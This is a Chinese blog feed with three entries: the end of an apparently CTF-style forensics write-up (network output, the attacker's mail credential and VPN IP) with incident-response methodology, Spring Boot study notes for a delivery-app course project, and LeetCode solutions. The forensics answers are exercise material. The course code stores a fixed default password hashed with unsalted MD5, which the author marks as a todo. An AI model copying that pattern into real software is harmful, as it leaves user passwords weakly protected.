<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599085 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032868 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476430398 (454.3 MiB)  TX bytes:1041839269 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>

<p>10、黑客使用了什么账号登陆了mail系统:</p>
<p>admin&#x2F;admin!@#pass123</p>
<p>11、黑客获得的vpn,ip是多少：</p>
<p>vpn中扫描其他ip最多的就是黑客的内网ip</p>
<p>10.3.4.3</p>
<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/218407.html">https://www.freebuf.com/articles/system/218407.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/436617932">https://zhuanlan.zhihu.com/p/436617932</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html">https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9">https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9</a></p>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><h4 id="3W1H"><a href="#3W1H" class="headerlink" title="3W1H"></a><strong>3W1H</strong></h4><p>who: 攻击者IP，受害主机是那些，是在那个安全设备上出现的告警</p>
<p>what：发生了什么攻击行为，是漏扫探测，还是已经打进来了？产品版本是多少？其他未失陷主机有没有这样的漏洞？</p>
<p>why：是因为开放了不安全端口？还是已有漏洞未修补？为什么前期没有排查出来？还是因为被钓鱼？</p>
<p>how：具体是怎么攻击的？是不是在野0day？怎么抑制？怎么修补？</p>
<h4 id="易失性原则"><a href="#易失性原则" class="headerlink" title="易失性原则"></a><strong>易失性原则</strong></h4><p>时效性</p>
<p>有一定的先后顺序，即最容易丢失的数据，应该最先收集，其它的依次类推。</p>
<h4 id="要素原则"><a href="#要素原则" class="headerlink" title="要素原则"></a><strong>要素原则</strong></h4><p>主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</p>
<h4 id="避害原则"><a href="#避害原则" class="headerlink" title="避害原则"></a><strong>避害原则</strong></h4><p>趋利避害，不能问题还没有解决，反而引入了新的问题。</p>
<p>失陷主机下线或隔离</p>
<p>使用来源不明被感染的工具</p>
<p>钓鱼样本或勒索样本不加密不压缩发送</p>
<h3 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a><strong>应急响应流程</strong></h3><p>判断是否是真实攻击，是否是误报</p>
<p>收集信息：收集客户信息和中毒主机信息，包括样本。</p>
<p>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、等等。</p>
<p>深入分析：日志分析、进程分析、启动项分析、样本分析。</p>
<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>
<p>产出报告：整理并输出完整的安全事件报告。</p>
]]></content>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>瑞吉外卖学习相关记录</title>
    <url>/2024/06/23/ruiji-waimai/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="相关分析"><a href="#相关分析" class="headerlink" title="相关分析"></a>相关分析</h2><ul>
<li><p>为啥配置@Configuration 和继承WebMvcConfigurationSupport 然后重写addResourceHandlers就能生效，分析下springboot的启动流程</p>
</li>
<li><p>&#96;&#96;&#96;<br>registry.addResourceHandler(“&#x2F;backend&#x2F;<strong>“).addResourceLocations(“classpath:&#x2F;backend&#x2F;“);<br>registry.addResourceHandler(“&#x2F;front&#x2F;</strong>“).addResourceLocations(“classpath:&#x2F;front&#x2F;“);</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  1. **`registry.addResourceHandler(&quot;/backend/\**&quot;)`**:</span><br><span class="line">     - 这部分代码告诉Spring MVC，所有以`/backend/`开头的URL请求（例如`/backend/some-file.js`）都应该被处理为静态资源请求。</span><br><span class="line">  2. **`addResourceLocations(&quot;classpath:/backend/&quot;)`**:</span><br><span class="line">     - 这部分代码指定了静态资源的实际存储位置。在这里，`classpath:/backend/`表示资源文件位于应用程序的类路径中的`/backend/`文件夹。</span><br><span class="line">     - 当用户请求一个以`/backend/`开头的URL时，Spring MVC将从`classpath:/backend/`目录中查找并返回相应的资源。</span><br><span class="line">     - 在 `addResourceLocations(&quot;classpath:/backend/&quot;)` 中，`classpath` 指的是 Java 类路径，它表示在应用程序运行时 JVM 用于查找类文件和资源文件的路径。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  methods: &#123;</span><br><span class="line">    async handleLogin() &#123;</span><br><span class="line">      this.$refs.loginForm.validate(async (valid) =&gt; &#123;</span><br><span class="line">        if (valid) &#123;</span><br><span class="line">          this.loading = true</span><br><span class="line">          let res = await loginApi(this.loginForm)</span><br><span class="line">          if (String(res.code) === &#x27;1&#x27;) &#123;</span><br><span class="line">            localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify(res.data))</span><br><span class="line">            window.location.href= &#x27;/backend/index.html&#x27;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            this.$message.error(res.msg)</span><br><span class="line">            this.loading = false</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这样用户直接访问&#x2F;backend&#x2F;index.html也行啊，得加下token什么的吧？</p>
<p><strong>看登录功能完善部分</strong></p>
<ul>
<li>之后测试下jmeter使用</li>
<li>之后看看session对象怎样保存的</li>
<li>之后跟断点研究下spring 过滤器和拦截器先后顺序或者写写代码看看日志打印顺序和函数栈</li>
<li>1</li>
</ul>
<h3 id="数据库表设置分析"><a href="#数据库表设置分析" class="headerlink" title="数据库表设置分析"></a>数据库表设置分析</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="可能存在的问题及做出的优化"><a href="#可能存在的问题及做出的优化" class="headerlink" title="可能存在的问题及做出的优化"></a>可能存在的问题及做出的优化</h2><ul>
<li><p>数据安全相关问题-密码加下salt （todo）</p>
</li>
<li><p>数据安全相关问题-yml文件账号密码加密配置下（todo）</p>
<p>不过这种方法感觉有点像脱裤子放屁，像前端账号密码加密传到后端一样</p>
<p>有空可以抓包看下传输到数据库的流量是否是解密后的账号、密码</p>
</li>
<li><p>设置不够优雅</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span><br><span class="line">public R&lt;String&gt; ExceptionHandler(SQLIntegrityConstraintViolationException ex)&#123;</span><br><span class="line">    if(ex.getMessage().contains((&quot;Duplicate entry&quot;)))&#123;</span><br><span class="line">        String[] split = ex.getMessage().split(&quot; &quot;);</span><br><span class="line">        String msg = split[2] + &quot;已存在&quot;;</span><br><span class="line">        return R.error(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看咋改能更加好看（todo）</p>
<ul>
<li>针对每个接口写下postman接口（todo）</li>
<li>针对每个接口使用pytest或者其它测试框架测试（可以压测下？看看怎样提高抗压能力）</li>
<li>1</li>
</ul>
<h2 id="环境相关配置"><a href="#环境相关配置" class="headerlink" title="环境相关配置"></a>环境相关配置</h2><p>课程相关资料地址：<a href="https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA">https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA</a> 提取码：1234</p>
<h3 id="mysql配置"><a href="#mysql配置" class="headerlink" title="mysql配置"></a>mysql配置</h3><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry.addResourceHandler(&quot;/backend/**&quot;).addResourceLocations(&quot;classpath:/backend&quot;);</span><br><span class="line">registry.addResourceHandler(&quot;/front/**&quot;).addResourceLocations(&quot;classpath:/front&quot;);</span><br><span class="line">log.info(&quot;配置springMvc成功&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="业务开发"><a href="#业务开发" class="headerlink" title="业务开发"></a>业务开发</h2><h3 id="后台系统登录业务"><a href="#后台系统登录业务" class="headerlink" title="后台系统登录业务"></a>后台系统登录业务</h3><p>访问controller后流程：Controller&#x3D;&gt;Service&#x3D;&gt;Mapper&#x3D;&gt;DB</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol>
<li><p>新建实体类Employee</p>
</li>
<li><p>新建mapper EmployeeMapper，继承自BaseMapper<Employee></p>
</li>
<li><p>新建接口 EmployeeService</p>
</li>
<li><p>新建EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements EmployeeService</p>
</li>
<li><p>新建EmployeeController</p>
</li>
<li><p>新建统一返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">R</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code; <span class="comment">//编码：1成功，0和其它数字为失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String msg; <span class="comment">//错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T data; <span class="comment">//数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//动态数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">success</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        R&lt;T&gt; r = <span class="keyword">new</span> <span class="title class_">R</span>&lt;T&gt;();</span><br><span class="line">        r.data = object;</span><br><span class="line">        r.code = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">error</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.msg = msg;</span><br><span class="line">        r.code = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> R&lt;T&gt; <span class="title function_">add</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>开发登录接口</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240624143258336.png" alt="image-20240624143258336" style="zoom: 80%;" /></li>
</ol>
<h3 id="后台系统退出"><a href="#后台系统退出" class="headerlink" title="后台系统退出"></a>后台系统退出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public R&lt;String&gt; logout(HttpServletRequest request)&#123;</span><br><span class="line">//        log.info(request.getSession().getAttribute(&quot;employee&quot;).toString());</span><br><span class="line">        request.getSession().removeAttribute(&quot;employee&quot;);</span><br><span class="line">        return R.success(&quot;退出成功&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="登录功能完善"><a href="#登录功能完善" class="headerlink" title="登录功能完善"></a>登录功能完善</h3><p>一般来说通过拦截器或过滤器实现</p>
<p><strong>过滤器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;loginCheckFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginCheckFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">AntPathMatcher</span> <span class="variable">PATH_MATCHER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"><span class="comment">//        log.info(&quot;拦截到请求&#123;&#125;&quot;, request.getRequestURI());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        String[] urls = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/employee/login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/employee/logout&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/backend/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/front/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">checked</span> <span class="operator">=</span> check(urls, requestURI);</span><br><span class="line">        <span class="keyword">if</span> (checked) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">&quot;未登录&quot;</span>);</span><br><span class="line">        response.getWriter().write(JSON.toJSONString(R.error(<span class="string">&quot;NOTLOGIN&quot;</span>)));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String[] urls, String requestURI)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (String url : urls) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> PATH_MATCHER.match(url, requestURI);</span><br><span class="line">            <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拦截器一般用来处理静态资源</p>
<p><a href="https://blog.csdn.net/xinzhifu1/article/details/106356958">过滤器 和 拦截器的 6个区别，别再傻傻分不清了_拦截器和过滤器的区别-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/feiying0canglang/article/details/120678900">Spring工具类–路径匹配(AntPathMatcher)–使用&#x2F;实例-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/zouyang920/article/details/107163539">@ServletComponentScan注解的作用-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/103622917">springboot @RequestBody注解学习_springboot requestbody-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/87364112">springboot controller接收参数_spring controller get param-CSDN博客</a></p>
<h3 id="新增员工"><a href="#新增员工" class="headerlink" title="新增员工"></a>新增员工</h3><h4 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostMapping</span><br><span class="line">public R&lt;String&gt; save(HttpServletRequest request, @RequestBody Employee employee)&#123;</span><br><span class="line">    employee.setPassword(DigestUtils.md5DigestAsHex(&quot;123456&quot;.getBytes()));</span><br><span class="line">    employee.setCreateTime(LocalDateTime.now());</span><br><span class="line">    employee.setUpdateTime(LocalDateTime.now());</span><br><span class="line">    Long empId = (Long) request.getSession().getAttribute(&quot;employee&quot;);</span><br><span class="line">    employee.setCreateUser(empId);</span><br><span class="line">    employee.setUpdateUser(empId);</span><br><span class="line">    employeeService.save(employee);</span><br><span class="line">    log.info(&quot;新增员工:&#123;&#125;&quot;,employee.toString());</span><br><span class="line">    return R.success(&quot;新增员工成功&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://baomidou.com/guides/data-interface/">持久层接口 | MyBatis-Plus (baomidou.com)</a></p>
<h4 id="全局异常处理"><a href="#全局异常处理" class="headerlink" title="全局异常处理"></a>全局异常处理</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ControllerAdvice(annotations = &#123;RestController.class, Controller.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">ExceptionHandler</span><span class="params">(SQLIntegrityConstraintViolationException ex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ex.getMessage().contains((<span class="string">&quot;Duplicate entry&quot;</span>)))&#123;</span><br><span class="line">            String[] split = ex.getMessage().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> split[<span class="number">2</span>] + <span class="string">&quot;已存在&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> R.error(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43842093/article/details/122269772">SQLIntegrityConstraintViolationException: 异常解决-CSDN博客</a></p>
<h3 id="员工信息分页管理"><a href="#员工信息分页管理" class="headerlink" title="员工信息分页管理"></a>员工信息分页管理</h3><h4 id="mybatis-plus插件配置"><a href="#mybatis-plus插件配置" class="headerlink" title="mybatis-plus插件配置"></a>mybatis-plus插件配置</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="业务代码-1"><a href="#业务代码-1" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/page&quot;)</span><br><span class="line">public R&lt;Page&gt; page(int page, int pageSize,String name)&#123;</span><br><span class="line">    log.info(&quot;page=&#123;&#125;,pageSize=&#123;&#125;,name=&#123;&#125;&quot;,page, pageSize, name);</span><br><span class="line">    Page pageInfo = new Page(page, pageSize);</span><br><span class="line">    LambdaQueryWrapper&lt;Employee&gt; queryWrapper = new LambdaQueryWrapper();</span><br><span class="line">    queryWrapper.like(StringUtils.isNotEmpty(name) ,Employee::getName, name);</span><br><span class="line">    queryWrapper.orderByDesc(Employee::getUpdateTime);</span><br><span class="line">    employeeService.page(pageInfo,queryWrapper);</span><br><span class="line">    return R.success(pageInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode周赛记录</title>
    <url>/2024/06/28/leetcode%E5%91%A8%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="404场周赛"><a href="#404场周赛" class="headerlink" title="404场周赛"></a>404场周赛</h2><h3 id="3200-三角形的最大高度-简单"><a href="#3200-三角形的最大高度-简单" class="headerlink" title="3200. 三角形的最大高度-简单"></a><a href="https://leetcode.cn/problems/maximum-height-of-a-triangle/">3200. 三角形的最大高度-简单</a></h3><h4 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你两个整数 red 和 blue，分别表示红色球和蓝色球的数量。你需要使用这些球来组成一个三角形，满足第 1 行有 1 个球，第 2 行有 2 个球，第 3 行有 3 个球，依此类推。</span><br><span class="line"></span><br><span class="line">每一行的球必须是 相同 颜色，且相邻行的颜色必须 不同。</span><br><span class="line"></span><br><span class="line">返回可以实现的三角形的 最大 高度。</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>暴力即可，即两种情况，最上面红色或者最上面蓝色。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxHeightOfTriangle</span><span class="params">(<span class="type">int</span> red, <span class="type">int</span> blue)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">red1</span> <span class="operator">=</span> red;</span><br><span class="line">        <span class="type">int</span> <span class="variable">red2</span> <span class="operator">=</span> red;</span><br><span class="line">        <span class="type">int</span> blue1= blue;</span><br><span class="line">        <span class="type">int</span> <span class="variable">blue2</span> <span class="operator">=</span> blue;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(res1%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                red1 -= (res1 + <span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                blue1 -= (res1 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(red1 &lt; <span class="number">0</span> || blue1 &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            res1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(res2%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                blue2 -= (res2 + <span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                red2 -= (res2 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(red2 &lt; <span class="number">0</span> || blue2 &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            res2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.max(res1, res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="官方题解新解法"><a href="#官方题解新解法" class="headerlink" title="官方题解新解法"></a>官方题解新解法</h4><p>数学法：<a href="https://leetcode.cn/problems/maximum-height-of-a-triangle/solutions/2826755/3200-san-jiao-xing-de-zui-da-gao-du-by-s-m0l3/">3200. 三角形的最大高度 - 力扣（LeetCode）</a></p>
<p>懒得看了，简单题，懒得理解数学法</p>
<h3 id="3201-找出有效子序列的最大长度-I-中等"><a href="#3201-找出有效子序列的最大长度-I-中等" class="headerlink" title="3201. 找出有效子序列的最大长度 I-中等"></a><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-i/">3201. 找出有效子序列的最大长度 I-中等</a></h3><h4 id="我的LC题解"><a href="#我的LC题解" class="headerlink" title="我的LC题解"></a>我的LC题解</h4><p><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-i/solutions/2831684/qi-ou-xing-fen-xi-zuo-ti-by-lvvkuyrei0-gan6/">3201. 找出有效子序列的最大长度 I - 力扣（LeetCode）</a></p>
<h4 id="题干-1"><a href="#题干-1" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个整数数组 nums。</span><br><span class="line"></span><br><span class="line">nums 的子序列 sub 的长度为 x ，如果其满足以下条件，则称其为 有效子序列：</span><br><span class="line"></span><br><span class="line">(sub[0] + sub[1]) % 2 == (sub[1] + sub[2]) % 2 == ... == (sub[x - 2] + sub[x - 1]) % 2</span><br><span class="line">返回 nums 的 最长的有效子序列 的长度。</span><br><span class="line"></span><br><span class="line">一个 子序列 指的是从原数组中删除一些元素（也可以不删除任何元素），剩余元素保持原来顺序组成的新数组。</span><br></pre></td></tr></table></figure>

<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>根据公式有 sub[n+1]-sub[n]&#x3D;&#x3D;sub[n+2]-sub[n+1]%2<br>模数为0 时候&#x3D;&gt; 全为奇数全为偶数<br>模数为1 时候&#x3D;&gt; 奇偶交错<br>分为三个case分析：<br>1.全为奇数：很简单，单编遍历，得出奇数个数就好<br>2.全为偶数：很简单，单编遍历，得出偶数个数就好<br>3.交错：这个情况要复杂点。不过有点像lc的交错数组，具体来说把奇数看成1，偶数看成0。来找最长交错数组。应该有这道题，一会补下链接<br>维护两个变量，up，down。当我们遍历数组处于i的位置时:<br>if nums[i]%2 &#x3D;&#x3D; 1: up &#x3D; down + 1 else down &#x3D; up + 1。</p>
